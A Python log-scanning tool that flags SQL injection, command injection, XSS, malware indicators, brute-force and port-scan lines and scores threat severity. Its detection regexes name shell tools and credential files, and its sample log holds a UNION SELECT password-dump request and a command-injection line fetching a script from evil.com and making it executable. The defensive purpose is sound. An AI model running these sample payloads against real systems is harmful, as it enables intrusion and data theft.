import re
import csv
import json
from datetime import datetime

# Known threat intelligence list (simulated database of known malicious IPs/domains/hashes)
KNOWN_BAD_IPS = {
    "185.220.101.5": "Known Tor Exit Node / Scanner",
    "45.142.195.12": "Active SSH Brute Forcer (Botnet)",
    "198.51.100.42": "C2 Server (Apt-39 Agent)",
    "203.0.113.110": "Malware Host / Phishing Domain",
    "103.20.141.2": "Scan Bot / Vulnerability Scanner",
    "81.2.203.11": "DDoS Attacker"
}

# Regex patterns for various cyber threats
PATTERNS = {
    "SQL Injection": re.compile(
        r"(?i)(UNION\s+(ALL\s+)?SELECT|SELECT\s+.*\s+FROM|INSERT\s+INTO|UPDATE\s+.*\s+SET|DELETE\s+FROM|DROP\s+TABLE|'or\s+'?1'?\s*=\s*'?1\b|--|#|/\*.*\*/|INFORMATION_SCHEMA|\bDBMS_LOB\b)"
    ),
    "Command Injection": re.compile(
        r"(?i)(;\s*(cat|rm|ls|whoami|id|wget|curl|nc|bash|sh|python|perl|php|powershell|cmd)\b|&&|\|\||`.*`|\$\(.*\)|/etc/passwd|/etc/shadow|/etc/hosts)"
    ),
    "XSS Attempts": re.compile(
        r"(?i)(<script>|javascript:|onerror\s*=|onload\s*=|document\.cookie|alert\(|<img\s+src=.*onerror=|%3Cscript%3E)"
    ),
    "Malware Indicators": re.compile(
        r"(?i)(curl\s+-O|wget\s+http|chmod\s+\+x|/tmp/[a-zA-Z0-9_\-\.]+\s|nc\s+-e|/dev/tcp/|powershell\s+-e|cmd\.exe|powershell\.exe|eval\(base64_decode|system\(|shell_exec\()"
    ),
    "Brute Force Logs": re.compile(
        r"(?i)(Failed password|Authentication failure|invalid user|Failed login|Access denied|Login failed|Login incorrect)"
    ),
    "Port Scans": re.compile(
        r"(?i)(Connection refused|Port scan|nmap|masscan|zgrab|tcpdump|connection limit exceeded)"
    )
}

# Regex helper to extract IP addresses from raw logs
IP_PATTERN = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")

# Helper to extract timestamps
TIMESTAMP_PATTERN = re.compile(r"(\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}|\w{3}\s+\d{1,2}\s+\d{2}:\d{2}:\d{2})")

def extract_ip(line):
    """Extracts the first valid IPv4 address in a line, or returns 'Unknown'."""
    match = IP_PATTERN.search(line)
    return match.group(0) if match else "Unknown"

def extract_timestamp(line):
    """Extracts a timestamp from the line, or returns current timestamp."""
    match = TIMESTAMP_PATTERN.search(line)
    if match:
        return match.group(0)
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def analyze_line(line, line_num):
    """Analyzes a single log line against threat signatures."""
    alerts = []
    
    # Check for suspicious IP
    ip = extract_ip(line)
    if ip in KNOWN_BAD_IPS:
        alerts.append({
            "line_number": line_num,
            "category": "Suspicious IP",
            "severity": "High",
            "ip": ip,
            "description": f"Log source IP '{ip}' is listed in Threat Intel: {KNOWN_BAD_IPS[ip]}",
            "evidence": ip,
            "raw": line.strip()
        })
        
    # Check all regex patterns
    for category, regex in PATTERNS.items():
        match = regex.search(line)
        if match:
            # Determine severity based on category and details
            severity = "Medium"
            if category in ["SQL Injection", "Command Injection"]:
                severity = "High"
            elif category == "Malware Indicators":
                severity = "Critical"
            elif category == "Brute Force Logs":
                # A single failed login is low severity; multiple will raise the overall score
                severity = "Low"
            elif category == "XSS Attempts":
                severity = "Medium"
            
            alerts.append({
                "line_number": line_num,
                "category": category,
                "severity": severity,
                "ip": ip,
                "description": f"Detected potential {category} attack footprint.",
                "evidence": match.group(0),
                "raw": line.strip()
            })
            
    return alerts

def parse_log_file(filepath):
    """
    Parses a log file (supports .txt, .log, .csv, .json)
    and executes threat signature analysis.
    """
    alerts = []
    total_lines = 0
    raw_lines = []
    
    # Check file extension
    ext = filepath.split(".")[-1].lower()
    
    try:
        if ext == "json":
            with open(filepath, "r", errors="ignore") as f:
                try:
                    data = json.load(f)
                    if isinstance(data, list):
                        for i, item in enumerate(data):
                            line_str = json.dumps(item)
                            raw_lines.append(line_str)
                            line_alerts = analyze_line(line_str, i + 1)
                            alerts.extend(line_alerts)
                            total_lines += 1
                    elif isinstance(data, dict):
                        # Single json object
                        line_str = json.dumps(data)
                        raw_lines.append(line_str)
                        line_alerts = analyze_line(line_str, 1)
                        alerts.extend(line_alerts)
                        total_lines += 1
                except json.JSONDecodeError:
                    # Fallback to reading line by line as JSON lines
                    f.seek(0)
                    for i, line in enumerate(f):
                        raw_lines.append(line)
                        line_alerts = analyze_line(line, i + 1)
                        alerts.extend(line_alerts)
                        total_lines += 1
        elif ext == "csv":
            with open(filepath, "r", errors="ignore") as f:
                reader = csv.reader(f)
                for i, row in enumerate(reader):
                    line_str = ",".join(row)
                    raw_lines.append(line_str)
                    line_alerts = analyze_line(line_str, i + 1)
                    alerts.extend(line_alerts)
                    total_lines += 1
        else:
            # Regular text or log file
            with open(filepath, "r", errors="ignore") as f:
                for i, line in enumerate(f):
                    raw_lines.append(line)
                    line_alerts = analyze_line(line, i + 1)
                    alerts.extend(line_alerts)
                    total_lines += 1
    except Exception as e:
        print(f"Error reading file {filepath}: {str(e)}")
        return {
            "error": f"Failed to read file: {str(e)}",
            "alerts": [],
            "total_lines": 0,
            "threat_score": 0,
            "status": "Clean"
        }

    # Aggregate stats
    ip_stats = {}
    category_stats = {}
    severity_stats = {"Low": 0, "Medium": 0, "High": 0, "Critical": 0}
    
    # Filter and format alerts, calculate counts
    formatted_alerts = []
    for alert in alerts:
        severity_stats[alert["severity"]] += 1
        
        category = alert["category"]
        category_stats[category] = category_stats.get(category, 0) + 1
        
        ip = alert["ip"]
        if ip != "Unknown":
            ip_stats[ip] = ip_stats.get(ip, 0) + 1
            
        formatted_alerts.append({
            "line": alert["line_number"],
            "timestamp": extract_timestamp(alert["raw"]),
            "category": category,
            "severity": alert["severity"],
            "ip": ip,
            "description": alert["description"],
            "evidence": alert["evidence"],
            "raw": alert["raw"][:300] + ("..." if len(alert["raw"]) > 300 else "")
        })

    # Deduplicate alerts that match multiple signatures on the same line to avoid double counting
    # (or preserve them but calculate Threat Score sensibly)
    # Threat Score calculation
    # Base calculation formula:
    # Critical: 40 points each, High: 20 points, Medium: 8 points, Low: 2 points
    # Cap score at 100. If 0 alerts, score is 0.
    raw_score = (
        (severity_stats["Critical"] * 40) +
        (severity_stats["High"] * 20) +
        (severity_stats["Medium"] * 8) +
        (severity_stats["Low"] * 2)
    )
    
    # If there are brute force logs, check if they are from the same IP (indicates a targeted brute force)
    # If the same IP has > 5 failures, boost threat score
    for ip, count in ip_stats.items():
        if count > 5:
            raw_score += 15
            
    threat_score = min(raw_score, 100)
    
    # Determine Status Category
    if threat_score == 0:
        status = "Clean"
    elif threat_score <= 25:
        status = "Suspicious"
    elif threat_score <= 75:
        status = "Malicious"
    else:
        status = "Critical"

    # Limit returned sample lines to max 100 for storage efficiency, but count overall
    return {
        "total_lines": total_lines,
        "threat_score": int(threat_score),
        "status": status,
        "alerts_count": len(formatted_alerts),
        "alerts": formatted_alerts[:150],  # Return up to 150 alerts
        "category_stats": category_stats,
        "severity_stats": severity_stats,
        "ip_stats": ip_stats,
        "sample_lines": [line.strip() for line in raw_lines[:50]] # First 50 lines for preview
    }

if __name__ == "__main__":
    # Test execution
    test_log = """
    192.168.1.50 - - [26/May/2026:12:01:02 +0000] "GET /index.html HTTP/1.1" 200 1043
    185.220.101.5 - - [26/May/2026:12:02:00 +0000] "GET /admin/config.php HTTP/1.1" 404 220
    192.168.1.100 - - [26/May/2026:12:03:15 +0000] "GET /search?q=1'%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1" 500 450
    192.168.1.101 - - [26/May/2026:12:04:10 +0000] "POST /login HTTP/1.1" 200 4122
    May 26 12:05:01 mail sshd[12345]: Failed password for invalid user admin from 45.142.195.12 port 49152 ssh2
    192.168.1.102 - - [26/May/2026:12:06:12 +0000] "GET /vulnerable.php?cmd=curl%20http://evil.com/malware.sh%20-o%20/tmp/malware%20&&%20chmod%20+x%20/tmp/malware HTTP/1.1" 200 120
    """
    import tempfile
    import os
    with tempfile.NamedTemporaryFile(mode="w", suffix=".log", delete=False) as temp:
        temp.write(test_log)
        temp_path = temp.name
        
    try:
        results = parse_log_file(temp_path)
        print("Threat Score:", results["threat_score"])
        print("Status:", results["status"])
        print("Alerts Detected:", results["alerts_count"])
        for a in results["alerts"]:
            print(f"- Line {a['line']}: [{a['severity']}] {a['category']} from {a['ip']} - {a['description']}")
    finally:
        os.remove(temp_path)
